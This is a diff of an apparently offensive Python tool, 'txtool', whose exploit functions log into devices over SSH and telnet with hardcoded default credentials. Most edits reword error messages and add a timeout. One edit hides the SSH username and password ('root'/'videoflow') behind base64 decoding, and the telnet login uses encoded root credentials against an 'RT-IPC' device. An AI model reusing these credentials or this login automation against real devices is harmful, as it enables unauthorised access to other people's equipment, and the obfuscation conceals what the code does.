@@ -74,7 +74,7 @@ Writen in python by Kuburan
             BACK.menu['menu_utama']()
 
         if not true_ip:
-            print(warna.merah + "\n[x] " + warna.tutup + "Warning. wrong ip address, txtool will be assume exploitation is canceled")
+            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
             raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
             BACK.menu['menu_utama']()
 
@@ -119,7 +119,7 @@ Writen in python by Kuburan
             BACK.menu['menu_utama']()
 
         if not true_ip:
-            print(warna.merah + "\n[x] " + warna.tutup + "Warning. wrong ip address, txtool will be assume exploitation is canceled")
+            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
             raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
             BACK.menu['menu_utama']()
 
@@ -360,7 +360,8 @@ def exploit3():
             BACK.menu['menu_utama']()
 
         if not true_ip:
-            print(warna.merah + "\n[x] " + warna.tutup + "incorrect IP address")
+            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
+            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
             BACK.menu['menu_utama']()
 
         port = '9000'
@@ -428,13 +429,14 @@ def exploit4():
     print(warna.kuning + "[!]" + warna.tutup + " Affected version : 2.10 (X-Prototype-Version: 1.6.0.2)")
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+    y = xxxx(b'cm9vdA==')
+    z = xxxx(b'dmlkZW9mbG93')
     _host = raw_input(warna.biru + "\n[+]" + warna.tutup + " Target ip address" + warna.kuning + "  >>  " + warna.tutup)
     paramiko.util.log_to_file("%s/%s.log" % (txtool_dir, _host))
-    _user = ["""root""",
+    _user = [y,
              """mom"""]
     _connection = None
-    p = ["""videoflow""",
+    p = [z,
          """$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./"""]
     _passwords = [line.strip() for line in p]
     _username = [line.strip() for line in _user]
@@ -445,7 +447,8 @@ def exploit4():
         BACK.menu['menu_utama']()
 
     if not true_ip:
-        print(warna.merah + "\n[x] " + warna.tutup + "incorrect IP address")
+        print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
+        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
         BACK.menu['menu_utama']()
 
     print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login...")
@@ -558,7 +561,7 @@ def exploit5():
         try:
             _user = xxxx(b'cm9vdA==')
             _password = xxxx(b'Y2F0MTAyOQ==')
-            tel_conn = telnetlib.Telnet(_host)
+            tel_conn = telnetlib.Telnet(_host, timeout=10)
             tel_conn.expect(["RT-IPC login: "], 10)
             tel_conn.write(_user + "\n")
             tel_conn.expect(["Password: ", "password"], 10)
